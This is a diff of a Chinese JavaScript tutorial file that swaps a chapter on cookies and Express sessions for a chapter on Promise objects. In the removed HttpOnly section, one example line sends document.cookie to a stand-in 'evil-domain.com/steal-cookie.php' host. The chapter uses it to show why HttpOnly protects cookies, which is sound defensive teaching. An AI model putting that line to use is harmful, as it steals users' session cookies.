@@ -1,545 +1,279 @@
-# 第11章 会话保持
-
-
+# Promise 对象
 
 ## 概述
 
-Cookie 是服务器保存在浏览器的一小段文本信息，每个 Cookie 的大小一般不能超过4KB。浏览器每次向服务器发出请求，就会自动附上这段信息。
+Promise 对象是 JavaScript 的异步操作解决方案，为异步操作提供统一接口。它起到代理作用（proxy），充当异步操作与回调函数之间的中介，使得异步操作具备同步操作的接口。Promise 可以让异步操作写起来，就像在写同步操作的流程，而不必一层层地嵌套回调函数。
 
-Cookie 主要用来分辨两个请求是否来自同一个浏览器，以及用来保存一些状态信息。它的常用场合有以下一些。
+注意，本章只是 Promise 对象的简单介绍。为了避免与后续教程的重复，更完整的介绍请看[《ES6 标准入门》](http://es6.ruanyifeng.com/)的[《Promise 对象》](http://es6.ruanyifeng.com/#docs/promise)一章。
 
-- 对话（session）管理：保存登录、购物车等需要记录的信息。
-- 个性化：保存用户的偏好，比如网页的字体大小、背景色等等。
-- 追踪：记录和分析用户行为。
+首先，Promise 是一个对象，也是一个构造函数。
 
-有些开发者使用 Cookie 作为客户端储存。这样做虽然可行，但是并不推荐，因为 Cookie 的设计目标并不是这个，它的容量很小（4KB），缺乏数据操作接口，而且会影响性能。客户端储存应该使用 Web storage API 和 IndexedDB。
-
-Cookie 包含以下几方面的信息。
-
-- Cookie 的名字
-- Cookie 的值（真正的数据写在这里面）
-- 到期时间
-- 所属域名（默认是当前域名）
-- 生效的路径（默认是当前网址）
-
-举例来说，用户访问网址`www.example.com`，服务器在浏览器写入一个 Cookie。这个 Cookie 就会包含`www.example.com`这个域名，以及根路径`/`。这意味着，这个 Cookie 对该域名的根路径和它的所有子路径都有效。如果路径设为`/forums`，那么这个 Cookie 只有在访问`www.example.com/forums`及其子路径时才有效。以后，浏览器一旦访问这个路径，浏览器就会附上这段 Cookie 发送给服务器。
-
-浏览器可以设置不接受 Cookie，也可以设置不向服务器发送 Cookie。`window.navigator.cookieEnabled`属性返回一个布尔值，表示浏览器是否打开 Cookie 功能。
-
-```
-// 浏览器是否打开 Cookie 功能
-window.navigator.cookieEnabled // true
-```
-
-`document.cookie`属性返回当前网页的 Cookie。
-
-```
-// 当前网页的 Cookie
-document.cookie
-```
-
-不同浏览器对 Cookie 数量和大小的限制，是不一样的。一般来说，单个域名设置的 Cookie 不应超过30个，每个 Cookie 的大小不能超过4KB。超过限制以后，Cookie 将被忽略，不会被设置。
-
-浏览器的同源政策规定，两个网址只要域名相同和端口相同，就可以共享 Cookie（参见《同源政策》一章）。注意，这里不要求协议相同。也就是说，`http://example.com`设置的 Cookie，可以被`https://example.com`读取。
-
-
-
-## Cookie 与 HTTP 协议
-
-Cookie 由 HTTP 协议生成，也主要是供 HTTP 协议使用。
-
-### HTTP 回应：Cookie 的生成
-
-服务器如果希望在浏览器保存 Cookie，就要在 HTTP 回应的头信息里面，放置一个`Set-Cookie`字段。
-
-```
-Set-Cookie:foo=bar
-```
-
-上面代码会在浏览器保存一个名为`foo`的 Cookie，它的值为`bar`。
-
-HTTP 回应可以包含多个`Set-Cookie`字段，即在浏览器生成多个 Cookie。下面是一个例子。
-
-```
-HTTP/1.0 200 OK
-Content-type: text/html
-Set-Cookie: yummy_cookie=choco
-Set-Cookie: tasty_cookie=strawberry
-
-[page content]
-```
-
-除了 Cookie 的值，`Set-Cookie`字段还可以附加 Cookie 的属性。
-
-```
-Set-Cookie: <cookie-name>=<cookie-value>; Expires=<date>
-Set-Cookie: <cookie-name>=<cookie-value>; Max-Age=<non-zero-digit>
-Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>
-Set-Cookie: <cookie-name>=<cookie-value>; Path=<path-value>
-Set-Cookie: <cookie-name>=<cookie-value>; Secure
-Set-Cookie: <cookie-name>=<cookie-value>; HttpOnly
-```
-
-上面的几个属性的含义，将在后文解释。
-
-一个`Set-Cookie`字段里面，可以同时包括多个属性，没有次序的要求。
-
-```
-Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>; Secure; HttpOnly
-```
-
-下面是一个例子。
-
-```
-Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
-```
-
-如果服务器想改变一个早先设置的 Cookie，必须同时满足四个条件：Cookie 的`key`、`domain`、`path`和`secure`都匹配。举例来说，如果原始的 Cookie 是用如下的`Set-Cookie`设置的。
-
-```
-Set-Cookie: key1=value1; domain=example.com; path=/blog
-```
-
-改变上面这个 Cookie 的值，就必须使用同样的`Set-Cookie`。
-
-```
-Set-Cookie: key1=value2; domain=example.com; path=/blog
-```
-
-只要有一个属性不同，就会生成一个全新的 Cookie，而不是替换掉原来那个 Cookie。
-
-```
-Set-Cookie: key1=value2; domain=example.com; path=/
-```
-
-上面的命令设置了一个全新的同名 Cookie，但是`path`属性不一样。下一次访问`example.com/blog`的时候，浏览器将向服务器发送两个同名的 Cookie。
-
-```
-Cookie: key1=value1; key1=value2
-```
-
-上面代码的两个 Cookie 是同名的，匹配越精确的 Cookie 排在越前面。
-
-
-
-### HTTP 请求：Cookie 的发送
-
-浏览器向服务器发送 HTTP 请求时，每个请求都会带上相应的 Cookie。也就是说，把服务器早前保存在浏览器的这段信息，再发回服务器。这时要使用 HTTP 头信息的`Cookie`字段。
-
-```
-Cookie: foo=bar
-```
-
-上面代码会向服务器发送名为`foo`的 Cookie，值为`bar`。
-
-`Cookie`字段可以包含多个 Cookie，使用分号（`;`）分隔。
-
-```
-Cookie: name=value; name2=value2; name3=value3
-```
-
-下面是一个例子。
-
-```
-GET /sample_page.html HTTP/1.1
-Host: www.example.org
-Cookie: yummy_cookie=choco; tasty_cookie=strawberry
-```
-
-服务器收到浏览器发来的 Cookie 时，有两点是无法知道的。
-
-- Cookie 的各种属性，比如何时过期。
-- 哪个域名设置的 Cookie，到底是一级域名设的，还是某一个二级域名设的。
-
-
-
-## Cookie 的属性
-
-### Expires，Max-Age
-
-`Expires`属性指定一个具体的到期时间，到了指定时间以后，浏览器就不再保留这个 Cookie。它的值是 UTC 格式，可以使用`Date.prototype.toUTCString()`进行格式转换。
-
-```
-Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
-```
-
-如果不设置该属性，或者设为`null`，Cookie 只在当前会话（session）有效，浏览器窗口一旦关闭，当前 Session 结束，该 Cookie 就会被删除。另外，浏览器根据本地时间，决定 Cookie 是否过期，由于本地时间是不精确的，所以没有办法保证 Cookie 一定会在服务器指定的时间过期。
-
-`Max-Age`属性指定从现在开始 Cookie 存在的秒数，比如`60 * 60 * 24 * 365`（即一年）。过了这个时间以后，浏览器就不再保留这个 Cookie。
-
-如果同时指定了`Expires`和`Max-Age`，那么`Max-Age`的值将优先生效。
-
-如果`Set-Cookie`字段没有指定`Expires`或`Max-Age`属性，那么这个 Cookie 就是 Session Cookie，即它只在本次对话存在，一旦用户关闭浏览器，浏览器就不会再保留这个 Cookie。
-
-### Domain，Path
-
-`Domain`属性指定浏览器发出 HTTP 请求时，哪些域名要附带这个 Cookie。如果没有指定该属性，浏览器会默认将其设为当前域名，这时子域名将不会附带这个 Cookie。比如，`example.com`不设置 Cookie 的`domain`属性，那么`sub.example.com`将不会附带这个 Cookie。如果指定了`domain`属性，那么子域名也会附带这个 Cookie。如果服务器指定的域名不属于当前域名，浏览器会拒绝这个 Cookie。
-
-`Path`属性指定浏览器发出 HTTP 请求时，哪些路径要附带这个 Cookie。只要浏览器发现，`Path`属性是 HTTP 请求路径的开头一部分，就会在头信息里面带上这个 Cookie。比如，`PATH`属性是`/`，那么请求`/docs`路径也会包含该 Cookie。当然，前提是域名必须一致。
-
-
-
-### Secure，HttpOnly
-
-`Secure`属性指定浏览器只有在加密协议 HTTPS 下，才能将这个 Cookie 发送到服务器。另一方面，如果当前协议是 HTTP，浏览器会自动忽略服务器发来的`Secure`属性。该属性只是一个开关，不需要指定值。如果通信是 HTTPS 协议，该开关自动打开。
-
-`HttpOnly`属性指定该 Cookie 无法通过 JavaScript 脚本拿到，主要是`document.cookie`属性、`XMLHttpRequest`对象和 Request API 都拿不到该属性。这样就防止了该 Cookie 被脚本读到，只有浏览器发出 HTTP 请求时，才会带上该 Cookie。
-
-```
-(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
-```
-
-上面是跨站点载入的一个恶意脚本的代码，能够将当前网页的 Cookie 发往第三方服务器。如果设置了一个 Cookie 的`HttpOnly`属性，上面代码就不会读到该 Cookie。
-
-
-
-## 在浏览器中操作 Cookie
-
-### document.cookie
-
-`document.cookie`属性用于读写当前网页的 Cookie。
-
-读取的时候，它会返回当前网页的所有 Cookie，前提是该 Cookie 不能有`HTTPOnly`属性。
-
-```
-document.cookie // "foo=bar;baz=bar"
-```
-
-上面代码从`document.cookie`一次性读出两个 Cookie，它们之间使用分号分隔。必须手动还原，才能取出每一个 Cookie 的值。
-
-```
-var cookies = document.cookie.split(';');
-
-for (var i = 0; i < cookies.length; i++) {
-  console.log(cookies[i]);
+```javascript
+function f1(resolve, reject) {
+  // 异步代码...
 }
-// foo=bar
-// baz=bar
+
+var p1 = new Promise(f1);
 ```
 
-`document.cookie`属性是可写的，可以通过它为当前网站添加 Cookie。
+上面代码中，`Promise`构造函数接受一个回调函数`f1`作为参数，`f1`里面是异步操作的代码。然后，返回的`p1`就是一个 Promise 实例。
 
-```
-document.cookie = 'fontSize=14';
-```
+Promise 的设计思想是，所有异步任务都返回一个 Promise 实例。Promise 实例有一个`then`方法，用来指定下一步的回调函数。
 
-写入的时候，Cookie 的值必须写成`key=value`的形式。注意，等号两边不能有空格。另外，写入 Cookie 的时候，必须对分号、逗号和空格进行转义（它们都不允许作为 Cookie 的值），这可以用`encodeURIComponent`方法达到。
-
-但是，`document.cookie`一次只能写入一个 Cookie，而且写入并不是覆盖，而是添加。
-
-```
-document.cookie = 'test1=hello';
-document.cookie = 'test2=world';
-document.cookie
-// test1=hello;test2=world
+```javascript
+var p1 = new Promise(f1);
+p1.then(f2);
 ```
 
-`document.cookie`读写行为的差异（一次可以读出全部 Cookie，但是只能写入一个 Cookie），与 HTTP 协议的 Cookie 通信格式有关。浏览器向服务器发送 Cookie 的时候，`Cookie`字段是使用一行将所有 Cookie 全部发送；服务器向浏览器设置 Cookie 的时候，`Set-Cookie`字段是一行设置一个 Cookie。
-
-写入 Cookie 的时候，可以一起写入 Cookie 的属性。
-
-```
-document.cookie = "foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT";
-```
-
-上面代码中，写入 Cookie 的时候，同时设置了`expires`属性。属性值的等号两边，也是不能有空格的。
-
-各个属性的写入注意点如下。
-
-- `path`属性必须为绝对路径，默认为当前路径。
-- `domain`属性值必须是当前发送 Cookie 的域名的一部分。比如，当前域名是`example.com`，就不能将其设为`foo.com`。该属性默认为当前的一级域名（不含二级域名）。
-- `max-age`属性的值为秒数。
-- `expires`属性的值为 UTC 格式，可以使用`Date.prototype.toUTCString()`进行日期格式转换。
-
-`document.cookie`写入 Cookie 的例子如下。
-
-```
-document.cookie = 'fontSize=14; '
-  + 'expires=' + someDate.toGMTString() + '; '
-  + 'path=/subdirectory; '
-  + 'domain=*.example.com';
-```
-
-Cookie 的属性一旦设置完成，就没有办法读取这些属性的值。
-
-删除一个现存 Cookie 的唯一方法，是设置它的`expires`属性为一个过去的日期。
-
-```
-document.cookie = 'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT';
-```
-
-上面代码中，名为`fontSize`的 Cookie 的值为空，过期时间设为1970年1月1月零点，就等同于删除了这个 Cookie。
-
-
-
-### js-cookie
-
-> https://github.com/js-cookie/js-cookie
-
-
-
-## 在 Node 中操作 Cookie
-
-### 设置cookie
-
-- 核心： ==cookie是随着响应头返回给浏览器的==
-- 设置cookie的核心思想： 使用 res.setHeader 或者 writeHeader 将cookie信息设置在响应头中
-- cookie设置格式：key=value;expires=time
-  - key: cookie的名称
-  - value： 名称对应的值
-  - expires： 有效期
-
-```js
-//1. 使用 setHeader 方法
-res.setHeader('set-cookie', 'id=101');                   //设置单个cookie
-res.setHeader('set-cookie', ['id=101', 'name=zs']);      //设置多个cookie
-
-//2. 使用 writeHeader 方法
-res.writeHeader(200, {
-    'content-type': 'text/html;charset=utf-8',
-    'set-cookie': ['type=10', 'name=my']
-})；
-
-//3. 使用 set 方法，该方法是express封装的方法
-res.set({'set-cookie':['goodsName=xiaomi 6', 'goodsPrice=3999']})；
-
-//4. 设置cookie时，指定有效期
-//注意：要使用UTC时间，使用 toUTCString()方法转换
-//设置有效期为 1小时
-const expiresTime = new Date(Date.now() + 3600000).toUTCString();
-res.set({'set-cookie':['goodsName=xiaomi 6;expires=' + expiresTime, 'goodsPrice=3999']})
-```
-
-
-
-1) 使用 setHeader 设置cookie
-
-![1550715805092](./assets/1550715805092-1553325280403.png)
-
-
-
-打开浏览器运行
-
-![1550715695394](./assets/1550715695394-1553325297231.png)
-
-
-
-![1550715834037](./assets/1550715834037-1553325311016.png)
-
-![1550715854650](./assets/1550715854650-1553325326587.png)
-
-![1550715877585](./assets/1550715877585-1553325343238.png)
-
-
-
-注意: 使用 setHeader 设置cookie时，只能使用一次，如果反复使用，后面会覆盖前面。
-
-
-
-2) 一次性设置多个cookie
-
-![1550715998056](./assets/1550715998056-1553325358646.png)
-
-
-
-![1550716026560](./assets/1550716026560-1553325371829.png)
-
-
-
-3) 使用 writeHeader 来设置cookie
-
-![1550717040205](./assets/1550717040205-1553325385819.png)
-
-
-
-
-
-
-
-
-
-###  读取cookie
-
-当网站已经给浏览器设置好cookie之后，浏览器再次请求网站的路由时，就会将cookie信息随请求头一起发送给服务器
-
-![1550717326882](./assets/1550717326882-1553325399932.png)
-
-
-
-
-
-核心： req.headers.cookie 中
-
-![1550717525173](./assets/1550717525173-1553325412893.png)
-
-
-
-所以： req.headers.cookie = 'id=10; name=ls; goodsName=xiaomi 6; goodsPrice=3999'
-
-目标:  
-
-   'id=10; name=ls; goodsName=xiaomi 6; goodsPrice=3999' 转为对象形式
-
-   {id:10, name:"ls", goodsName:"xiaomi 6"; goodsPrice:3999}
-
-
-
-```js
-//node提供了系统模块 querystring 能够帮助我们将cookie字符串拆分为对象
-const qs = require('querystring');
-const obj = qs.parse('id=10001;name=zs', ';', '=');
-console.log(obj);   // {id:10001, name:"zs"}
-```
-
-req.url     req.method     req.headers
-
-
-
-![1550718010509](./assets/1550718010509-1553325425301.png)
-
-
-
-
-
-
-
-### cookie有效期
-
-- 设置了expires则有效期到expires指定的时间
-- 未设置expires则关闭浏览器cookie即消失
-
-
-
-![1550718521440](./assets/1550718521440-1553325438148.png)
-
-
-
-```js
-//一天
-new Date（Date.now() + 3600000 * 24）;
-
-//一周
-new Date（Date.now() + 3600000 * 24 * 7）;
-```
-
-
-
-
-
-
-
-## Session
-
-###  session介绍
-
-- 因为cookie是保存在客户端的数据，不够安全，所以出现了session。
-- session会将数据保存到服务器端（保存在文件、内存服务器或数据表中），安全性就可以得到保证。
-
-
-
-###  设置/读取session
-
-express设置session时，需要使用第三方模块 --- express-session
-
-```shell
-npm i express-session
-```
-
-
-
-使用步骤：
-
-1) 加载 express-session 模块
-
-2) 将session注册为中间件
-
-3) 使用req.session对象设置/读取session
-
-```js
-//1. 加载 express-session 模块
-const session = require('express-session');
-//2. 配置项
-const obj = {
-    secret: '4ey32erfyf3fgpg',   //加密字符串。 使用该字符串来加密session数据，自定义
-    resave: false,               //强制保存session即使它并没有变化
-    saveUninitialized: false     //强制将未初始化的session存储。当新建了一个session且未
-    							 //设定属性或值时，它就处于未初始化状态。
-};
-//3. 注册为express-session中间件
-app.use(session(obj));
-
-//4. 使用 req.session.属性 = 值  方式来设置session
-app.get('/sets', (req, res) => {
-    req.session.isLogin = true;
-    req.session.userInfo = {user_id:10001, user_name:"zs"};
-    //注意：一定要将数据发回给浏览器，否则session无法生效
-    res.send('设置session');
+上面代码中，`f1`的异步操作执行完成，就会执行`f2`。
+
+传统的写法可能需要把`f2`作为回调函数传入`f1`，比如写成`f1(f2)`，异步操作完成后，在`f1`内部调用`f2`。Promise 使得`f1`和`f2`变成了链式写法。不仅改善了可读性，而且对于多层嵌套的回调函数尤其方便。
+
+```javascript
+// 传统写法
+step1(function (value1) {
+  step2(value1, function(value2) {
+    step3(value2, function(value3) {
+      step4(value3, function(value4) {
+        // ...
+      });
+    });
+  });
 });
 
-//设置好之后，req.session中的结构
-req.session = {
-    isLogin: true,
-    userInfo: {user_id:10001, user_name:"zs"}
-}
+// Promise 的写法
+(new Promise(step1))
+  .then(step2)
+  .then(step3)
+  .then(step4);
 ```
 
+从上面代码可以看到，采用 Promises 以后，程序流程变得非常清楚，十分易读。注意，为了便于理解，上面代码的`Promise`实例的生成格式，做了简化，真正的语法请参照下文。
 
+总的来说，传统的回调函数写法使得代码混成一团，变得横向发展而不是向下发展。Promise 就是解决这个问题，使得异步流程可以写成同步流程。
 
+Promise 原本只是社区提出的一个构想，一些函数库率先实现了这个功能。ECMAScript 6 将其写入语言标准，目前 JavaScript 原生支持 Promise 对象。
 
+## Promise 对象的状态
 
-### session有效期
+Promise 对象通过自身的状态，来控制异步操作。Promise 实例具有三种状态。
 
-- 当浏览器关闭后，session消失
-- express-session会将session保存在内存中，每次重启服务器时即使没有关闭浏览器session也会消失
+- 异步操作未完成（pending）
+- 异步操作成功（fulfilled）
+- 异步操作失败（rejected）
 
+上面三种状态里面，`fulfilled`和`rejected`合在一起称为`resolved`（已定型）。
 
+这三种的状态的变化途径只有两种。
 
-###  删除session
+- 从“未完成”到“成功”
+- 从“未完成”到“失败”
 
-核心： req.session.destroy()    销毁所有session
+一旦状态发生变化，就凝固了，不会再有新的状态变化。这也是 Promise 这个名字的由来，它的英语意思是“承诺”，一旦承诺成效，就不得再改变了。这也意味着，Promise 实例的状态变化只可能发生一次。
 
-![1550720468344](./assets/155072046834411.png)
+因此，Promise 的最终结果只有两种。
 
+- 异步操作成功，Promise 实例传回一个值（value），状态变为`fulfilled`。
+- 异步操作失败，Promise 实例抛出一个错误（error），状态变为`rejected`。
 
+## Promise 构造函数
 
+JavaScript 提供原生的`Promise`构造函数，用来生成 Promise 实例。
 
+```javascript
+var promise = new Promise(function (resolve, reject) {
+  // ...
 
-###  session 的有效范围
+  if (/* 异步操作成功 */){
+    resolve(value);
+  } else { /* 异步操作失败 */
+    reject(new Error());
+  }
+});
+```
 
-在一个网站中设置了session，则整个网站都能找到这个session
+上面代码中，`Promise`构造函数接受一个函数作为参数，该函数的两个参数分别是`resolve`和`reject`。它们是两个函数，由 JavaScript 引擎提供，不用自己实现。
 
+`resolve`函数的作用是，将`Promise`实例的状态从“未完成”变为“成功”（即从`pending`变为`fulfilled`），在异步操作成功时调用，并将异步操作的结果，作为参数传递出去。`reject`函数的作用是，将`Promise`实例的状态从“未完成”变为“失败”（即从`pending`变为`rejected`），在异步操作失败时调用，并将异步操作报出的错误，作为参数传递出去。
 
+下面是一个例子。
 
-## Cookie 和 Session 的原理
+```javascript
+function timeout(ms) {
+  return new Promise((resolve, reject) => {
+    setTimeout(resolve, ms, 'done');
+  });
+}
 
-###  cookie原理
+timeout(100)
+```
 
-1) 浏览器第一次访问带有cookie设置的路由时，服务器会将cookie信息通过响应头返回给浏览器
+上面代码中，`timeout(100)`返回一个 Promise 实例。100毫秒以后，该实例的状态会变为`fulfilled`。
 
-2) 之后浏览器每次访问服务器时都会将cookie信息通过请求头发送给服务器
+## Promise.prototype.then()
 
+Promise 实例的`then`方法，用来添加回调函数。
 
+`then`方法可以接受两个回调函数，第一个是异步操作成功时（变为`fulfilled`状态）的回调函数，第二个是异步操作失败（变为`rejected`）时的回调函数（该参数可以省略）。一旦状态改变，就调用相应的回调函数。
 
-### session原理
+```javascript
+var p1 = new Promise(function (resolve, reject) {
+  resolve('成功');
+});
+p1.then(console.log, console.error);
+// "成功"
 
-![4](./assets/4-1553325560473-1553325562016.png)
+var p2 = new Promise(function (resolve, reject) {
+  reject(new Error('失败'));
+});
+p2.then(console.log, console.error);
+// Error: 失败
+```
 
+上面代码中，`p1`和`p2`都是Promise 实例，它们的`then`方法绑定两个回调函数：成功时的回调函数`console.log`，失败时的回调函数`console.error`（可以省略）。`p1`的状态变为成功，`p2`的状态变为失败，对应的回调函数会收到异步操作传回的值，然后在控制台输出。
 
+`then`方法可以链式使用。
 
-1) 浏览器第一次访问带有session设置的路由时，服务器会自动产生一个sessionId（一个很长的随机字符串），该sessionId有两个作用
+```javascript
+p1
+  .then(step1)
+  .then(step2)
+  .then(step3)
+  .then(
+    console.log,
+    console.error
+  );
+```
 
-   ① 随着cookie返回给浏览器，保存在浏览器中   （==相当于一把钥匙==）
+上面代码中，`p1`后面有四个`then`，意味依次有四个回调函数。只要前一步的状态变为`fulfilled`，就会依次执行紧跟在后面的回调函数。
 
-   ② 在服务器开辟一块内存并以该sessionId命名，将数据保存在该内存中 （==相当于一个箱子==）
+最后一个`then`方法，回调函数是`console.log`和`console.error`，用法上有一点重要的区别。`console.log`只显示`step3`的返回值，而`console.error`可以显示`p1`、`step1`、`step2`、`step3`之中任意一个发生的错误。举例来说，如果`step1`的状态变为`rejected`，那么`step2`和`step3`都不会执行了（因为它们是`resolved`的回调函数）。Promise 开始寻找，接下来第一个为`rejected`的回调函数，在上面代码中是`console.error`。这就是说，Promise 对象的报错具有传递性。
 
+## then() 用法辨析
 
+Promise 的用法，简单说就是一句话：使用`then`方法添加回调函数。但是，不同的写法有一些细微的差别，请看下面四种写法，它们的差别在哪里？
 
-2) 浏览器之后每一次访问服务器时，sessionId都会随着请求头发送给服务器，服务器就能根据sessionId
+```javascript
+// 写法一
+f1().then(function () {
+  return f2();
+});
 
+// 写法二
+f1().then(function () {
+  f2();
+});
 
+// 写法三
+f1().then(f2());
 
+// 写法四
+f1().then(f2);
+```
 
+为了便于讲解，下面这四种写法都再用`then`方法接一个回调函数`f3`。写法一的`f3`回调函数的参数，是`f2`函数的运行结果。
 
-## 参考资料
+```javascript
+f1().then(function () {
+  return f2();
+}).then(f3);
+```
 
-- https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies
+写法二的`f3`回调函数的参数是`undefined`。
+
+```javascript
+f1().then(function () {
+  f2();
+  return;
+}).then(f3);
+```
+
+写法三的`f3`回调函数的参数，是`f2`函数返回的函数的运行结果。
+
+```javascript
+f1().then(f2())
+  .then(f3);
+```
+
+写法四与写法一只有一个差别，那就是`f2`会接收到`f1()`返回的结果。
+
+```javascript
+f1().then(f2)
+  .then(f3);
+```
+
+## 实例：图片加载
+
+下面是使用 Promise 完成图片的加载。
+
+```javascript
+var preloadImage = function (path) {
+  return new Promise(function (resolve, reject) {
+    var image = new Image();
+    image.onload  = resolve;
+    image.onerror = reject;
+    image.src = path;
+  });
+};
+```
+
+上面的`preloadImage`函数用法如下。
+
+```javascript
+preloadImage('https://example.com/my.jpg')
+  .then(function (e) { document.body.append(e.target) })
+  .then(function () { console.log('加载成功') })
+```
+
+## 小结
+
+Promise 的优点在于，让回调函数变成了规范的链式写法，程序流程可以看得很清楚。它有一整套接口，可以实现许多强大的功能，比如同时执行多个异步操作，等到它们的状态都改变以后，再执行一个回调函数；再比如，为多个回调函数中抛出的错误，统一指定处理方法等等。
+
+而且，Promise 还有一个传统写法没有的好处：它的状态一旦改变，无论何时查询，都能得到这个状态。这意味着，无论何时为 Promise 实例添加回调函数，该函数都能正确执行。所以，你不用担心是否错过了某个事件或信号。如果是传统写法，通过监听事件来执行回调函数，一旦错过了事件，再添加回调函数是不会执行的。
+
+Promise 的缺点是，编写的难度比传统写法高，而且阅读代码也不是一眼可以看懂。你只会看到一堆`then`，必须自己在`then`的回调函数里面理清逻辑。
+
+## 微任务
+
+Promise 的回调函数属于异步任务，会在同步任务之后执行。
+
+```javascript
+new Promise(function (resolve, reject) {
+  resolve(1);
+}).then(console.log);
+
+console.log(2);
+// 2
+// 1
+```
+
+上面代码会先输出2，再输出1。因为`console.log(2)`是同步任务，而`then`的回调函数属于异步任务，一定晚于同步任务执行。
+
+但是，Promise 的回调函数不是正常的异步任务，而是微任务（microtask）。它们的区别在于，正常任务追加到下一轮事件循环，微任务追加到本轮事件循环。这意味着，微任务的执行时间一定早于正常任务。
+
+```javascript
+setTimeout(function() {
+  console.log(1);
+}, 0);
+
+new Promise(function (resolve, reject) {
+  resolve(2);
+}).then(console.log);
+
+console.log(3);
+// 3
+// 2
+// 1
+```
+
+上面代码的输出结果是`321`。这说明`then`的回调函数的执行时间，早于`setTimeout(fn, 0)`。因为`then`是本轮事件循环执行，`setTimeout(fn, 0)`在下一轮事件循环开始时执行。
+
+## 参考链接
+
+- Sebastian Porto, [Asynchronous JS: Callbacks, Listeners, Control Flow Libs and Promises](http://sporto.github.com/blog/2012/12/09/callbacks-listeners-promises/)
+- Rhys Brett-Bowen, [Promises/A+ - understanding the spec through implementation](http://modernjavascript.blogspot.com/2013/08/promisesa-understanding-by-doing.html)
+- Matt Podwysocki, Amanda Silver, [Asynchronous Programming in JavaScript with “Promises”](http://blogs.msdn.com/b/ie/archive/2011/09/11/asynchronous-programming-in-javascript-with-promises.aspx)
+- Marc Harter, [Promise A+ Implementation](https://gist.github.com//wavded/5692344)
+- Bryan Klimt, [What’s so great about JavaScript Promises?](http://blog.parse.com/2013/01/29/whats-so-great-about-javascript-promises/)
+- Jake Archibald, [JavaScript Promises There and back again](http://www.html5rocks.com/en/tutorials/es6/promises/)
+- Mikito Takada, [7. Control flow, Mixu's Node book](http://book.mixu.net/node/ch7.html)
